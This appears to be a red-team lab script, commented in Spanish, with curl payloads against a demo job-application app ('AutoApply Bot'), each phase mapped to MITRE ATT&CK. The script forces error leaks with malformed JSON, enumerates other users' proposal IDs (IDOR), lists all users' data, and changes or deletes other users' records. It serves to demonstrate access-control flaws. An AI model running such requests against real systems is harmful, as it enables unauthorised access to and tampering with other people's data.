#!/bin/bash
# =============================================================
# PAYLOADS DE ATAQUE — AutoApply Bot
# Red Team: Nahomy Rada (Especialista en Explotación)
# Vulnerabilidades: IDOR (A01:2025) + Mishandling (A10:2025)
# Marco: MITRE ATT&CK®
# =============================================================

# ---- FASE 1: RECONOCIMIENTO (TA0043 · T1592) ----------------
# Forzar error interno enviando JSON malformado
# Objetivo: obtener stack trace, nombre de tablas, versión de DB

curl -X POST http://[IP-UBUNTU]:3001/api/proposals \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{"job_offer_id": "esto_no_es_un_numero"}'

# ---- FASE 2: ACCESO INICIAL (TA0001 · T1078) ----------------
# Registrar cuenta legítima y obtener JWT

curl -X POST http://[IP-UBUNTU]:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@test.com","password":"Attack123!"}'

curl -X POST http://[IP-UBUNTU]:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Attack123!"}'

# ---- FASE 3: DESCUBRIMIENTO (TA0007 · T1518) ----------------
# Enumerar IDs de propuestas ajenas iterando el parámetro

curl -X GET http://[IP-UBUNTU]:3001/api/proposals/1 \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"

curl -X GET http://[IP-UBUNTU]:3001/api/proposals/2 \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"

# ---- FASE 4: RECOLECCIÓN (TA0009 · T1213) -------------------
# Acceder a datos de todos los usuarios sin filtro

curl -X GET http://[IP-UBUNTU]:3001/api/proposals \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"

# ---- FASE 5: EXFILTRACIÓN (TA0010 · T1567) ------------------
# Modificar estado de propuesta ajena

curl -X PATCH http://[IP-UBUNTU]:3001/api/proposals/1/status \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [TOKEN_ATACANTE]" \
  -d '{"status":"rejected"}'

# Eliminar propuesta ajena
curl -X DELETE http://[IP-UBUNTU]:3001/api/proposals/1 \
  -H "Authorization: Bearer [TOKEN_ATACANTE]"
